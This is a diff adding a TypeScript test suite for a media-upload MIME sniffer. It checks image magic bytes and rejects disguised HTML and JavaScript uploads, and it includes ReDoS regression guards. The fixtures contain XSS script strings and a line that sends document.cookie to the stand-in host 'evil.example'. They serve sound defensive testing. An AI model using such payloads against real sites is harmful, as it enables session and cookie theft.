@@ -1,0 +1,110 @@
+import { describe, expect, test } from "bun:test";
+
+import { sniffNewsMediaMimeType } from "../src/modules/media-library/domain/media-mime-sniffer";
+
+function bytesOf(...values: number[]): Uint8Array {
+  return new Uint8Array(values);
+}
+
+describe("sniffNewsMediaMimeType (Issue #634)", () => {
+  test("recognizes JPEG magic bytes", () => {
+    expect(
+      sniffNewsMediaMimeType(bytesOf(0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10))
+    ).toBe("image/jpeg");
+  });
+
+  test("recognizes PNG magic bytes", () => {
+    expect(
+      sniffNewsMediaMimeType(
+        bytesOf(0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00)
+      )
+    ).toBe("image/png");
+  });
+
+  test("recognizes GIF87a and GIF89a magic bytes", () => {
+    expect(
+      sniffNewsMediaMimeType(
+        bytesOf(0x47, 0x49, 0x46, 0x38, 0x37, 0x61, 0x00, 0x00)
+      )
+    ).toBe("image/gif");
+    expect(
+      sniffNewsMediaMimeType(
+        bytesOf(0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x00, 0x00)
+      )
+    ).toBe("image/gif");
+  });
+
+  test("recognizes WebP (RIFF....WEBP) magic bytes", () => {
+    const bytes = new TextEncoder().encode("RIFF\x00\x00\x00\x00WEBPVP8 ");
+    expect(sniffNewsMediaMimeType(bytes)).toBe("image/webp");
+  });
+
+  test("returns undefined for an HTML payload disguised with a .jpg name/claimed mime type — the exact Issue #631 exploit scenario", () => {
+    const html = new TextEncoder().encode(
+      "<html><body><script>alert('xss')</script></body></html>"
+    );
+    expect(sniffNewsMediaMimeType(html)).toBeUndefined();
+  });
+
+  test("returns undefined for a JS payload", () => {
+    const js = new TextEncoder().encode(
+      "fetch('https://evil.example/steal?c=' + document.cookie)"
+    );
+    expect(sniffNewsMediaMimeType(js)).toBeUndefined();
+  });
+
+  test("returns undefined for empty/too-short input", () => {
+    expect(sniffNewsMediaMimeType(new Uint8Array())).toBeUndefined();
+    expect(sniffNewsMediaMimeType(bytesOf(0xff))).toBeUndefined();
+  });
+
+  test("recognizes a plain SVG root element (Issue #806 — sniffing recognizes the SHAPE only; content safety is media-svg-safety.ts's separate job, so this is recognized as SVG even though it also contains a <script>)", () => {
+    const svg = new TextEncoder().encode(
+      "<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"
+    );
+    expect(sniffNewsMediaMimeType(svg)).toBe("image/svg+xml");
+  });
+
+  test("recognizes an SVG with an XML prolog, DOCTYPE, and a leading comment before the root element", () => {
+    const svg = new TextEncoder().encode(
+      '﻿<?xml version="1.0" encoding="UTF-8"?>\n' +
+        "<!-- logo -->\n" +
+        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n' +
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"></svg>'
+    );
+    expect(sniffNewsMediaMimeType(svg)).toBe("image/svg+xml");
+  });
+
+  test("does not recognize an SVG fragment embedded partway through another document", () => {
+    const html = new TextEncoder().encode(
+      "<html><body><svg></svg></body></html>"
+    );
+    expect(sniffNewsMediaMimeType(html)).toBeUndefined();
+  });
+
+  test("a pathological repeated-comment prefix that never resolves to <svg resolves in milliseconds, not catastrophically (CodeQL js/redos regression guard)", () => {
+    // The shape a naive `(?:<!--[\s\S]*?-->)*` regex backtracks catastrophically
+    // on: many repetitions of a comment-close immediately followed by a new
+    // comment-open, with no `<svg` ever arriving. `looksLikeSvg`'s manual scan
+    // is O(n) regardless, so this must return promptly.
+    const adversarial = new TextEncoder().encode(
+      "--><!--".repeat(20_000) + "not svg"
+    );
+    const start = performance.now();
+    const result = sniffNewsMediaMimeType(adversarial);
+    const elapsedMs = performance.now() - start;
+    expect(result).toBeUndefined();
+    expect(elapsedMs).toBeLessThan(200);
+  });
+
+  test("an adversarial prefix of many <!DOCTYPE-shaped opens that never closes resolves promptly and is not recognized as SVG", () => {
+    const adversarial = new TextEncoder().encode(
+      "<!DOCTYPE ".repeat(20_000) + "not svg"
+    );
+    const start = performance.now();
+    const result = sniffNewsMediaMimeType(adversarial);
+    const elapsedMs = performance.now() - start;
+    expect(result).toBeUndefined();
+    expect(elapsedMs).toBeLessThan(200);
+  });
+});
